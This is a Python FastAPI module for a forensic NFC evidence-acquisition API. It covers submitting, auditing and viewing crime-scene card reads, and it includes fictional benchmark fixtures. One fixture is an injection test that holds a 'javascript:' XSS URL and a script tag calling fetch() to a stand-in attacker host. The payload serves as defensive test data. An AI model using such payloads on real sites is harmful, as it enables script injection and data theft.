"""
Forensic NFC Evidence Acquisition REST API.
Provides endpoints for crime scene Web NFC data ingestion, granular status polling,
detailed acquisition dossiers, and benchmark crime scene test card fixtures.
Enforces strict RBAC (evidence.nfc.acquire) and Case Authorization.
"""

import logging
from typing import Optional, Dict, Any, List
from fastapi import APIRouter, Depends, HTTPException, Request
from pydantic import BaseModel, Field
from sqlalchemy.orm import Session

from app.core.database import get_db
from app.models.iam_models import UserModel
from app.authorization.dependencies import require_case_access, get_client_ip
from app.authorization.permissions import Permissions
from app.services.nfc_evidence_service import nfc_evidence_service
from app.audit.audit_service import record_audit_event, AuditAction

logger = logging.getLogger("investigation.api.nfc_evidence")
router = APIRouter(prefix="/cases/{case_id}/evidence/nfc", tags=["NFC Crime Scene Evidence"])

class RawNFCRecord(BaseModel):
    record_type: str = "text"
    media_type: Optional[str] = None
    encoding: Optional[str] = "utf-8"
    lang: Optional[str] = "en"
    data_text: Optional[str] = None
    data_bytes_hex: Optional[str] = None

class RawNFCPayload(BaseModel):
    serial_number: Optional[str] = None
    card_uid: Optional[str] = None
    records: List[RawNFCRecord] = Field(default_factory=list)

class NFCAcquisitionRequest(BaseModel):
    raw_payload: RawNFCPayload
    location_metadata: Optional[Dict[str, Any]] = None
    hardware_metadata: Optional[Dict[str, Any]] = None
    allow_duplicate: bool = False

@router.post("/acquisitions")
def submit_nfc_acquisition(
    case_id: str,
    payload: NFCAcquisitionRequest,
    request: Request,
    current_user: UserModel = Depends(require_case_access(Permissions.EVIDENCE_NFC_ACQUIRE)),
    db: Session = Depends(get_db)
):
    """
    Submits raw crime scene NFC evidence captured via Web NFC.
    Enforces canonical SHA-256 calculation, MinIO AES-256-GCM encryption,
    audit logging, entity resolution, and cross-domain correlation.
    """
    record_audit_event(
        action=AuditAction.NFC_EVIDENCE_ACQUIRED,
        result="SUCCESS",
        user_id=current_user.id,
        actor=current_user.official_email,
        role=current_user.role.name if current_user.role else None,
        case_id=case_id,
        ip_address=get_client_ip(request),
        db=db
    )

    try:
        result = nfc_evidence_service.acquire_nfc_evidence(
            case_id=case_id,
            raw_payload=payload.raw_payload.dict(),
            acquired_by=current_user.employee_id or current_user.official_email,
            location_metadata=payload.location_metadata,
            hardware_metadata=payload.hardware_metadata,
            allow_duplicate=payload.allow_duplicate
        )
        return result
    except ValueError as ve:
        raise HTTPException(status_code=400, detail=str(ve))
    except Exception as e:
        logger.exception(f"Unhandled error in NFC acquisition: {e}")
        raise HTTPException(status_code=500, detail=f"Failed to acquire NFC evidence: {str(e)}")

@router.get("/acquisitions/{acquisition_id}")
def get_nfc_acquisition_dossier(
    case_id: str,
    acquisition_id: str,
    request: Request,
    current_user: UserModel = Depends(require_case_access(Permissions.EVIDENCE_VIEW)),
    db: Session = Depends(get_db)
):
    """
    Retrieves the complete forensic NFC dossier:
    Observed raw facts, derived normalized identifiers, entity resolution explainability,
    case correlations across 6+ domains, and neutral investigative advisory.
    """
    dossier = nfc_evidence_service.get_acquisition_dossier(
        acquisition_id=acquisition_id, case_id=case_id
    )
    if not dossier:
        raise HTTPException(status_code=404, detail=f"Acquisition '{acquisition_id}' not found in case '{case_id}'.")
    return dossier

@router.get("/acquisitions/{acquisition_id}/status")
def get_nfc_acquisition_status(
    case_id: str,
    acquisition_id: str,
    current_user: UserModel = Depends(require_case_access(Permissions.EVIDENCE_VIEW))
):
    """Polls granular processing status of an NFC acquisition."""
    dossier = nfc_evidence_service.get_acquisition_dossier(
        acquisition_id=acquisition_id, case_id=case_id
    )
    if not dossier:
        raise HTTPException(status_code=404, detail=f"Acquisition '{acquisition_id}' not found.")
    return {
        "acquisition_id": acquisition_id,
        "evidence_id": dossier["evidence_id"],
        "status": dossier["acquisition_status"],
        "sha256": dossier["raw_sha256"],
        "finding_id": dossier.get("finding_id")
    }

@router.get("/status")
def get_nfc_scanner_status(
    case_id: str,
    current_user: UserModel = Depends(require_case_access(Permissions.EVIDENCE_VIEW))
):
    """Returns status and configuration of NFC evidence acquisition service."""
    import datetime
    return {
        "status": "READY",
        "case_id": case_id,
        "supported_technologies": ["NDEF", "Mifare", "ISO 14443", "FeliCa"],
        "max_message_bytes": 512 * 1024,
        "max_record_bytes": 256 * 1024,
        "system_time_utc": datetime.datetime.now(datetime.timezone.utc).isoformat()
    }

@router.get("/fixtures")
def get_benchmark_nfc_fixtures(
    case_id: str,
    current_user: UserModel = Depends(require_case_access(Permissions.EVIDENCE_VIEW))
):
    """
    Returns verified forensic test card fixtures for development, evaluation,
    and desktop simulation without physical NFC hardware.
    """
    return {
        "fixtures": [
            {
                "id": "FIXTURE-SYNDICATE-01",
                "label": "Iron Lotus Syndicate Keycard (Arjun Mehta)",
                "description": "Physical card recovered from safehouse containing primary syndicate lead's contact.",
                "card_uid": "04:8E:2A:4F:91:02:80",
                "records": [
                    {
                        "record_type": "text",
                        "encoding": "utf-8",
                        "data_text": "Arjun Mehta"
                    },
                    {
                        "record_type": "text",
                        "encoding": "utf-8",
                        "data_text": "+919810011223"
                    },
                    {
                        "record_type": "url",
                        "encoding": "utf-8",
                        "data_text": "https://secure-vault.iron-lotus.in/node-04"
                    }
                ],
                "expected_outcome": "MATCHED with Golden Profile CLUSTER_001 (Arjun Mehta) with CDR and Bank correlations."
            },
            {
                "id": "FIXTURE-VCARD-02",
                "label": "vCard Business Contact (Sana Qureshi)",
                "description": "Smart business card encoded with full vCard 3.0 directory profile.",
                "card_uid": "04:3B:71:A9:05:44:81",
                "records": [
                    {
                        "record_type": "mime",
                        "media_type": "text/vcard",
                        "encoding": "utf-8",
                        "data_text": "BEGIN:VCARD\nVERSION:3.0\nFN:Sana Qureshi\nTEL;TYPE=CELL:+919810099881\nEMAIL:sana.q@crypto-exchange.in\nORG:Apex Financial Solutions\nADR:;;Sector 62;Noida;UP;201309;India\nEND:VCARD"
                    }
                ],
                "expected_outcome": "MATCHED with Golden Profile CLUSTER_002 (Sana Qureshi) with multiple independent corroborations."
            },
            {
                "id": "FIXTURE-AMBIGUOUS-03",
                "label": "Common Name Card (Raj Kumar)",
                "description": "Recovered card with only a common human name and no unique anchors.",
                "card_uid": "04:A2:CC:55:18:99:80",
                "records": [
                    {
                        "record_type": "text",
                        "encoding": "utf-8",
                        "data_text": "Raj Kumar"
                    }
                ],
                "expected_outcome": "POSSIBLE_MATCH (Multiple candidates exist; system strictly avoids forcing an arbitrary match)."
            },
            {
                "id": "FIXTURE-UNKNOWN-04",
                "label": "New Unregistered Field Card (Vikram Malhotra)",
                "description": "Card found at crime scene belonging to a previously uncatalogued subject.",
                "card_uid": "04:FE:99:12:00:33:80",
                "records": [
                    {
                        "record_type": "text",
                        "encoding": "utf-8",
                        "data_text": "Vikram Malhotra"
                    },
                    {
                        "record_type": "text",
                        "encoding": "utf-8",
                        "data_text": "+919988776655"
                    },
                    {
                        "record_type": "text",
                        "encoding": "utf-8",
                        "data_text": "vikram.m@unknown-domain.org"
                    }
                ],
                "expected_outcome": "NO_MATCH (Creates provisional entity P-NFC-... preserving full provenance)."
            },
            {
                "id": "FIXTURE-SECURITY-05",
                "label": "Adversarial / Malicious Tag (Injection Test)",
                "description": "Simulates attacker tag with javascript: execution attempt and HTML tags.",
                "card_uid": "04:DE:AD:BE:EF:00:80",
                "records": [
                    {
                        "record_type": "url",
                        "encoding": "utf-8",
                        "data_text": "javascript:alert('XSS Attack Execution');"
                    },
                    {
                        "record_type": "text",
                        "encoding": "utf-8",
                        "data_text": "<script>fetch('http://attacker.com/leak')</script> Rogue Subject"
                    }
                ],
                "expected_outcome": "SECURITY_FLAGGED (Dangerous URL scheme blocked, raw payload preserved, no code execution)."
            }
        ]
    }
